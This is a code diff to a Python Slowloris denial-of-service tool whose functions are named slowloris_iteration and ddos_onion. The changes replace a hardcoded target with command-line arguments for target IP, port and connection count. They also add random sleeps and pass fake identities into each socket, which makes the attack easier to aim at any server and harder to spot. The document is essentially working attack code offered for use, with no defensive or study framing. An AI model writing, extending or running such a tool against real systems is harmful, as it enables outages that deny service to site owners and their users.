@@ -51,21 +51,33 @@ def slowloris_iteration(list_of_sockets):
     logging.debug("Creating %s new sockets...", diff)
     for _ in range(diff):
         try:
-            s = init_socket("192.168.1.1", 80, identity)  # Replace with your target IP and port
+            s = init_socket("192.168.1.1", 80, identity)
             list_of_sockets.append(s)
         except socket.error as e:
             logging.debug("Failed to create new socket: %s", e)
             break
 
+    # Sleep for a random amount of time to slow down the attack
+    sleep_time = random.randint(1, 5)
+    logging.debug("Sleeping for %s seconds...", sleep_time)
+    time.sleep(sleep_time)
+
 def ddos_onion():
     logging.basicConfig(level=logging.DEBUG)
 
-    target_ip = "192.168.1.1"
-    target_port = 80
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
+    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
+    parser.add_argument("-c", "--connections", type=int, default=100, help="Number of initial connections")
+    args = parser.parse_args()
+
+    target_ip = args.target
+    target_port = args.port
+    num_connections = args.connections
 
     list_of_sockets = []
 
-    for _ in range(100):  # Number of initial connections
+    for _ in range(num_connections):  # Number of initial connections
         try:
             s = init_socket(target_ip, target_port, generate_fake_identity())
             list_of_sockets.append(s)
